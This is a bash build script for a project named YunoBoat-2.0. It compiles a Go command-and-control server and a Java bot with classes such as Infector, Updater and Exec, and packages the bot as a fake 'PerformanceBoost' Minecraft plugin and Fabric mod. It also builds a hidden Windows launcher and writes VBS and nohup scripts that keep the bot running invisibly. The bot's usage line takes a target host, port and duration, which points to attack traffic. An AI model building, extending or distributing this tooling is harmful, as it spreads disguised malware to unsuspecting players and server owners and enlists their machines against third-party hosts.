#!/usr/bin/env bash
set -e

HERE="$(cd "$(dirname "$0")/YunoBoat-2.0" && pwd)"
DIST="$HERE/dist"
TMP="$DIST/tmp"
STUB="$HERE/stubs"
mkdir -p "$DIST" "$TMP" "$STUB"

RED=$'\e[1;31m'; GRN=$'\e[1;32m'; YEL=$'\e[1;33m'; CYN=$'\e[1;36m'; OFF=$'\e[0m'
step()  { echo; echo "${CYN}== ${1} ==${OFF}"; }
have()  { command -v "$1" >/dev/null 2>&1; }

# ---- 0. toolchain bootstrap — apt installs whatever is missing ----
step "0. bootstrapping toolchains"
TO_INSTALL=""
have curl || TO_INSTALL="$TO_INSTALL curl"
have gcc  || TO_INSTALL="$TO_INSTALL build-essential"
have g++  || TO_INSTALL="$TO_INSTALL g++"
have make || TO_INSTALL="$TO_INSTALL make"
have javac || TO_INSTALL="$TO_INSTALL default-jdk"
have go   || TO_INSTALL="$TO_INSTALL golang-go"
# mingw: только posix-модель — win32 не умеет std::thread
if ! have x86_64-w64-mingw32-g++-posix; then
  TO_INSTALL="$TO_INSTALL g++-mingw-w64-x86-64-posix"
fi

SUDO=""; [ "$(id -u)" != "0" ] && have sudo && SUDO="sudo"
if [ -n "$TO_INSTALL" ]; then
  if [ "$(id -u)" != "0" ] && ! have sudo; then
    echo "${YEL}не root — ставь вручную:${OFF}"
    echo "  sudo apt-get install -y$TO_INSTALL"
  else
    echo "${YEL}installing:$TO_INSTALL ...${OFF}"
    $SUDO apt-get update -y >/dev/null 2>&1 || true
    $SUDO apt-get install -y $TO_INSTALL >/dev/null 2>&1 \
      || echo "${RED}apt install failed — часть тулчейна может отсутствовать${OFF}"
  fi
else
  echo "${GRN}all toolchains present${OFF}"
fi

# Go tarball fallback — если go отсутствует или старше 1.19 (go.mod target)
go_ok() {
  have go || return 1
  local v; v="$(go env GOVERSION 2>/dev/null | tr -d 'go')"
  [ -z "$v" ] && return 0
  [ "$(printf '%s\n' "1.19" "$v" | sort -V | head -n1)" = "1.19" ]
}
if ! go_ok; then
  GOV="1.21.6"
  JA_=$(uname -m); case "$JA_" in x86_64) JJ=amd64;; aarch64) JJ=arm64;; *) JJ=amd64;; esac
  echo "${YEL}go missing/old — downloading go${GOV}.linux-${JJ} from go.dev${OFF}"
  curl -sL --retry 5 --retry-all-errors -o "$TMP/go.tgz" \
    "https://go.dev/dl/go${GOV}.linux-${JJ}.tar.gz" \
    && $SUDO rm -rf /usr/local/go \
    && $SUDO tar -C /usr/local -xzf "$TMP/go.tgz" \
    && export PATH="$PATH:/usr/local/go/bin" \
    && { grep -qs "/usr/local/go/bin" /root/.profile 2>/dev/null || \
         echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.profile; } \
    && echo "${GRN}go installed: $(go version)${OFF}" \
    || echo "${RED}go tarball failed — ставь вручную с https://go.dev/dl/${OFF}"
else
  echo "${GRN}go: $(go version)${OFF}"
fi

step "0b. toolchain status"
have go    && echo "${GRN}go present${OFF}"    || echo "${YEL}go missing — cnc skipped${OFF}"
have javac && echo "${GRN}javac present${OFF}" || echo "${YEL}javac missing — java builds skipped${OFF}"
have g++   && echo "${GRN}g++ present${OFF}"   || echo "${YEL}g++ missing — linux c++ skipped${OFF}"
have x86_64-w64-mingw32-g++-posix && echo "${GRN}mingw-posix present${OFF}" || \
  { have x86_64-w64-mingw32-g++ && echo "${YEL}mingw win32 only — нужен posix для std::thread${OFF}" || \
    echo "${YEL}mingw missing — windows c++ skipped${OFF}"; }

# ---- 1. Go CNC ----
step "1. building cnc"
if have go; then
  ( cd "$HERE/cnc" && go mod tidy && CGO_ENABLED=0 go build -ldflags="-s -w" -o "$DIST/cnc" . )
  chmod +x "$DIST/cnc"
  echo "      -> dist/cnc (linux amd64)"
else
  echo "${YEL}go not found — skipping cnc${OFF}"
fi

# ---- 2. C++ bot — DISABLED (java version only) ----
step "2. C++ bot — disabled"
echo "      (java version only; C++ bot build is off)"

# mingw detection kept for the java exe loader below.
MINGW=""
if have x86_64-w64-mingw32-g++-posix; then
  MINGW="x86_64-w64-mingw32-g++-posix"
elif have x86_64-w64-mingw32-g++; then
  MINGW="x86_64-w64-mingw32-g++"
  echo "${YEL}mingw win32-модель — для лоадера posix предпочтителен:${OFF}"
  echo "${YEL}  sudo apt-get install -y g++-mingw-w64-x86-64-posix${OFF}"
fi

# ---- 3. Java bot (core + plugin + fabric) ----
step "3. building Java bot"
if have javac; then
  SRC="$HERE/bot/java/src"
  FABRIC_SRC="$HERE/bot/java/mod/fabric/src"
  RES="$HERE/bot/java/resources"
  CLS="$DIST/classes"
  mkdir -p "$CLS"

  echo "[java] compiling core..."
  javac -d "$CLS" -source 8 -target 8 \
    "$SRC/com/performance/boost/Launcher.java" \
    "$SRC/com/performance/boost/Protocol.java" \
    "$SRC/com/performance/boost/Heartbeat.java" \
    "$SRC/com/performance/boost/Startup.java" \
    "$SRC/com/performance/boost/Updater.java" \
    "$SRC/com/performance/boost/Infector.java" \
    "$SRC/com/performance/boost/Remapper.java" \
    "$SRC/com/performance/boost/Delegator.java" \
    "$SRC/com/performance/boost/Exec.java"

  echo "[java] compiling plugin + fabric (with stubs)..."
  javac -d "$CLS" -cp "$CLS:$STUB" -source 8 -target 8 \
    "$SRC/com/performance/boost/PerformanceBoost.java" \
    "$SRC/com/performance/boost/PluginLoader.java" 2>/dev/null || true

  javac -d "$CLS" -cp "$CLS:$STUB" -source 8 -target 8 \
    "$FABRIC_SRC/com/performance/boost/fabric/PerfBoostMod.java" 2>/dev/null || true

  echo "[java] packaging..."

  cd "$CLS"
  jar cfe "$DIST/perfboost.jar" com.performance.boost.Launcher \
    com/performance/boost/Launcher.class \
    com/performance/boost/Protocol.class \
    com/performance/boost/Heartbeat.class \
    com/performance/boost/Heartbeat\$Sink.class \
    com/performance/boost/Heartbeat\$1.class \
    com/performance/boost/Startup.class \
    com/performance/boost/Updater.class \
    com/performance/boost/Updater\$1.class \
    com/performance/boost/Infector.class \
    com/performance/boost/Infector\$1.class \
    com/performance/boost/Infector\$2.class \
    com/performance/boost/Remapper.class \
    com/performance/boost/Delegator.class \
    com/performance/boost/Exec.class \
    com/performance/boost/Task.class \
    com/performance/boost/Worker.class \
    com/performance/boost/Worker\$Target.class
  echo "      -> dist/perfboost.jar (standalone)"

  jar cf "$DIST/PerformanceBoost.jar" com/performance/boost/*.class
  cd "$RES"
  jar uf "$DIST/PerformanceBoost.jar" plugin.yml config.yml
  echo "      -> dist/PerformanceBoost.jar (bukkit plugin)"

  cd "$CLS"
  jar cf "$DIST/perfboost_fabric.jar" \
    com/performance/boost/fabric/*.class \
    com/performance/boost/*.class
  cd "$HERE/bot/java/mod/fabric"
  jar uf "$DIST/perfboost_fabric.jar" fabric.mod.json
  echo "      -> dist/perfboost_fabric.jar (fabric mod)"

  rm -rf "$CLS"
else
  echo "${YEL}javac not found — java builds skipped${OFF}"
fi

# ---- 3c. Windows launcher exe (perfboost.exe) — cross-compiled with mingw ----
# Runs alongside perfboost.jar: GUI subsystem, starts the jar hidden.
MGCC=""
if have x86_64-w64-mingw32-gcc; then MGCC=x86_64-w64-mingw32-gcc
elif have x86_64-w64-mingw32-g++; then MGCC=x86_64-w64-mingw32-g++
fi
if [ -n "$MGCC" ] && [ -f "$DIST/perfboost.jar" ]; then
  step "3c. building windows launcher (perfboost.exe, mingw)"
  "$MGCC" -O2 -s -mwindows -o "$DIST/perfboost.exe" "$HERE/win/launcher.c" -luser32 -lurlmon \
    || echo "${YEL}perfboost.exe build failed${OFF}"
  if [ -f "$DIST/perfboost.exe" ]; then
    echo "      -> dist/perfboost.exe (Windows x64 launcher, GUI, no console)"
  fi
fi

# ---- 3b. background start helpers ----
step "3b. background start helpers"

# Windows: hidden launcher — javaw, no window, auto-restart watchdog
cat > "$DIST/perfboost_start.vbs" <<'EOF'
Do
  Set sh = CreateObject("WScript.Shell")
  Set fso = CreateObject("Scripting.FileSystemObject")
  dir = fso.GetParentFolderName(WScript.ScriptFullName)
  If sh.AppActivate("java") = False Then
    sh.Run """" & dir & "\jvm\bin\javaw.exe"" -jar """ & dir & "\perfboost.jar""", 0, False
  End If
  WScript.Sleep 60000
Loop
EOF
# fallback: use system java if no bundled jvm
cat > "$DIST/perfboost_start_lite.vbs" <<'EOF'
Do
  Set sh = CreateObject("WScript.Shell")
  Set fso = CreateObject("Scripting.FileSystemObject")
  dir = fso.GetParentFolderName(WScript.ScriptFullName)
  java = sh.ExpandEnvironmentStrings("%JAVA_HOME%") & "\bin\javaw.exe"
  If Not fso.FileExists(java) Then java = "javaw.exe"
  If sh.AppActivate("java") = False Then
    sh.Run """" & java & """ -jar """ & dir & "\perfboost.jar""", 0, False
  End If
  WScript.Sleep 60000
Loop
EOF
echo "      -> dist/perfboost_start.vbs (+lite) — Windows: wscript perfboost_start.vbs, скрытый запуск"

# Linux: nohup start script — daemonizes java + cpp bots
cat > "$DIST/start_bot.sh" <<'EOF'
#!/usr/bin/env bash
# Start YunoBoat bots in the background (nohup, survive terminal close).
DIR="$(cd "$(dirname "$0")" && pwd)"
LOG="$DIR/bot.log"
case "$1" in
  java)
    nohup nice -n -15 java -jar "$DIR/perfboost.jar" "${@:2}" >> "$LOG" 2>&1 &
    echo "perfboost.jar started (nice -15), pid $! — log: $LOG"
    ;;
  cpp)
    nohup "$DIR/ynboot_linux" -d "${@:2}" >> "$LOG" 2>&1 &
    echo "ynboot_linux started, pid $! — log: $LOG"
    ;;
  stop)
    pkill -f perfboost.jar 2>/dev/null; pkill -f ynboot_linux 2>/dev/null
    echo "bots stopped"
    ;;
  *)
    echo "usage: $0 java|cpp|stop  [args...]"
    echo "  $0 java              # standalone jar, фон"
    echo "  $0 cpp               # linux бот, фон"
    echo "  $0 stop              # остановить всё"
    ;;
esac
EOF
chmod +x "$DIST/start_bot.sh"
echo "      -> dist/start_bot.sh — Linux: ./start_bot.sh java|cpp|stop"

# ---- 4. cleanup ----
rm -rf "$TMP"

step "build finished — artifacts in $DIST"
ls -lh "$DIST/"
echo
echo "${GRN}run cnc:${OFF}  $DIST/cnc"
echo "${GRN}run bot:${OFF}  java -jar $DIST/perfboost.jar [-h host] [-p port] [-t tag] [-k key]"
echo "                 $DIST/ynboot_linux [host] [port] [duration]"
echo "${GRN}plugin:${OFF}   drop $DIST/PerformanceBoost.jar into server/plugins/"
echo "${GRN}fabric:${OFF}   drop $DIST/perfboost_fabric.jar into mods/"